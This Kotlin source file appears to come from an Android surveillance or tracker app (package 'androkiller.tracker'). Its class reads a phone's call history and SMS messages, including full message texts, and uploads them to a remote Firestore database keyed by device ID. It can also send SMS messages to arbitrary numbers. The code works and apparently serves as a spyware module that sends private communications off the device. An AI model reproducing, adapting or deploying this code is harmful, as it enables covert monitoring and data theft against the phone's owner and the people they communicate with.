package com.nexus.androkiller.tracker

import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.provider.CallLog
import android.provider.Telephony
import android.telephony.SmsManager
import android.util.Log
import androidx.core.content.ContextCompat
import com.google.firebase.firestore.FieldValue
import com.google.firebase.firestore.FirebaseFirestore
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext

data class CallLogItem(
    val id: String = "",
    val number: String = "",
    val name: String = "",
    val type: String = "UNKNOWN", // "INCOMING", "OUTGOING", "MISSED", "REJECTED"
    val durationSeconds: Long = 0L,
    val durationFormatted: String = "",
    val timestamp: Long = 0L
)

data class SmsMessageItem(
    val id: String = "",
    val address: String = "",
    val body: String = "",
    val type: String = "INBOX", // "INBOX", "SENT"
    val timestamp: Long = 0L
)

class CallSmsManager(private val context: Context) {

    private val firestore: FirebaseFirestore?
        get() = try {
            FirebaseFirestore.getInstance()
        } catch (_: Exception) {
            null
        }

    fun hasCallLogPermission(): Boolean {
        return ContextCompat.checkSelfPermission(
            context,
            android.Manifest.permission.READ_CALL_LOG
        ) == PackageManager.PERMISSION_GRANTED
    }

    fun hasSmsPermission(): Boolean {
        return ContextCompat.checkSelfPermission(
            context,
            android.Manifest.permission.READ_SMS
        ) == PackageManager.PERMISSION_GRANTED
    }

    fun readCallLogs(maxCount: Int = 50): List<CallLogItem> {
        if (!hasCallLogPermission()) {
            Log.w(TAG, "READ_CALL_LOG permission not granted")
            return emptyList()
        }

        val items = mutableListOf<CallLogItem>()
        val projection = arrayOf(
            CallLog.Calls._ID,
            CallLog.Calls.NUMBER,
            CallLog.Calls.CACHED_NAME,
            CallLog.Calls.TYPE,
            CallLog.Calls.DATE,
            CallLog.Calls.DURATION
        )

        try {
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                projection,
                null,
                null,
                "${CallLog.Calls.DATE} DESC"
            )

            cursor?.use {
                val idCol = it.getColumnIndex(CallLog.Calls._ID)
                val numCol = it.getColumnIndex(CallLog.Calls.NUMBER)
                val nameCol = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
                val typeCol = it.getColumnIndex(CallLog.Calls.TYPE)
                val dateCol = it.getColumnIndex(CallLog.Calls.DATE)
                val durCol = it.getColumnIndex(CallLog.Calls.DURATION)

                while (it.moveToNext() && items.size < maxCount) {
                    val rawId = if (idCol != -1) it.getString(idCol) ?: "" else ""
                    val number = if (numCol != -1) it.getString(numCol) ?: "Unknown" else "Unknown"
                    val name = if (nameCol != -1) it.getString(nameCol) ?: "" else ""
                    val rawType = if (typeCol != -1) it.getInt(typeCol) else -1
                    val date = if (dateCol != -1) it.getLong(dateCol) else 0L
                    val duration = if (durCol != -1) it.getLong(durCol) else 0L

                    val typeStr = when (rawType) {
                        CallLog.Calls.INCOMING_TYPE -> "INCOMING"
                        CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
                        CallLog.Calls.MISSED_TYPE -> "MISSED"
                        CallLog.Calls.REJECTED_TYPE -> "REJECTED"
                        else -> "OTHER"
                    }

                    val durFormatted = if (duration < 60) {
                        "${duration}s"
                    } else {
                        "${duration / 60}m ${duration % 60}s"
                    }

                    items.add(
                        CallLogItem(
                            id = rawId.ifBlank { (number + "_" + date).hashCode().toString() },
                            number = number,
                            name = name,
                            type = typeStr,
                            durationSeconds = duration,
                            durationFormatted = durFormatted,
                            timestamp = date
                        )
                    )
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error querying call logs: ${e.message}", e)
        }

        return items
    }

    fun readSmsMessages(maxCount: Int = 50): List<SmsMessageItem> {
        if (!hasSmsPermission()) {
            Log.w(TAG, "READ_SMS permission not granted")
            return emptyList()
        }

        val items = mutableListOf<SmsMessageItem>()
        val projection = arrayOf(
            Telephony.Sms._ID,
            Telephony.Sms.ADDRESS,
            Telephony.Sms.BODY,
            Telephony.Sms.TYPE,
            Telephony.Sms.DATE
        )

        try {
            val cursor = context.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                projection,
                null,
                null,
                "${Telephony.Sms.DATE} DESC"
            )

            cursor?.use {
                val idCol = it.getColumnIndex(Telephony.Sms._ID)
                val addrCol = it.getColumnIndex(Telephony.Sms.ADDRESS)
                val bodyCol = it.getColumnIndex(Telephony.Sms.BODY)
                val typeCol = it.getColumnIndex(Telephony.Sms.TYPE)
                val dateCol = it.getColumnIndex(Telephony.Sms.DATE)

                while (it.moveToNext() && items.size < maxCount) {
                    val rawId = if (idCol != -1) it.getString(idCol) ?: "" else ""
                    val address = if (addrCol != -1) it.getString(addrCol) ?: "Unknown" else "Unknown"
                    val body = if (bodyCol != -1) it.getString(bodyCol) ?: "" else ""
                    val rawType = if (typeCol != -1) it.getInt(typeCol) else -1
                    val date = if (dateCol != -1) it.getLong(dateCol) else 0L

                    val typeStr = when (rawType) {
                        Telephony.Sms.MESSAGE_TYPE_SENT -> "SENT"
                        Telephony.Sms.MESSAGE_TYPE_INBOX -> "INBOX"
                        else -> "OTHER"
                    }

                    items.add(
                        SmsMessageItem(
                            id = rawId.ifBlank { (address + "_" + date).hashCode().toString() },
                            address = address,
                            body = body,
                            type = typeStr,
                            timestamp = date
                        )
                    )
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error querying SMS messages: ${e.message}", e)
        }

        return items
    }

    suspend fun syncCallLogsToFirestore(deviceId: String): Result<Int> = withContext(Dispatchers.IO) {
        val db = firestore ?: return@withContext Result.failure(IllegalStateException("Firestore not available"))
        try {
            val logs = readCallLogs()
            val maps = logs.map {
                hashMapOf(
                    "id" to it.id,
                    "number" to it.number,
                    "name" to it.name,
                    "type" to it.type,
                    "durationSeconds" to it.durationSeconds,
                    "durationFormatted" to it.durationFormatted,
                    "timestamp" to it.timestamp
                )
            }

            val payload = hashMapOf(
                "deviceId" to deviceId,
                "totalCount" to logs.size,
                "lastSynced" to FieldValue.serverTimestamp(),
                "callLogs" to maps
            )

            db.collection("devices")
                .document(deviceId)
                .collection("telephony")
                .document("call_logs")
                .set(payload)
                .await()

            Log.i(TAG, "Synced ${logs.size} call logs for device $deviceId")
            Result.success(logs.size)
        } catch (e: Exception) {
            Log.e(TAG, "Failed syncing call logs: ${e.message}", e)
            Result.failure(e)
        }
    }

    suspend fun syncSmsToFirestore(deviceId: String): Result<Int> = withContext(Dispatchers.IO) {
        val db = firestore ?: return@withContext Result.failure(IllegalStateException("Firestore not available"))
        try {
            val messages = readSmsMessages()
            val maps = messages.map {
                hashMapOf(
                    "id" to it.id,
                    "address" to it.address,
                    "body" to it.body,
                    "type" to it.type,
                    "timestamp" to it.timestamp
                )
            }

            val payload = hashMapOf(
                "deviceId" to deviceId,
                "totalCount" to messages.size,
                "lastSynced" to FieldValue.serverTimestamp(),
                "messages" to maps
            )

            db.collection("devices")
                .document(deviceId)
                .collection("telephony")
                .document("sms_logs")
                .set(payload)
                .await()

            Log.i(TAG, "Synced ${messages.size} SMS messages for device $deviceId")
            Result.success(messages.size)
        } catch (e: Exception) {
            Log.e(TAG, "Failed syncing SMS: ${e.message}", e)
            Result.failure(e)
        }
    }

    fun sendSms(destinationAddress: String, text: String): Boolean {
        return try {
            val smsManager: SmsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                context.getSystemService(SmsManager::class.java)
            } else {
                @Suppress("DEPRECATION")
                SmsManager.getDefault()
            }
            smsManager.sendTextMessage(destinationAddress, null, text, null, null)
            Log.i(TAG, "Sent SMS to $destinationAddress: $text")
            true
        } catch (e: Exception) {
            Log.e(TAG, "Failed sending SMS: ${e.message}", e)
            false
        }
    }

    companion object {
        private const val TAG = "CallSmsManager"
    }
}
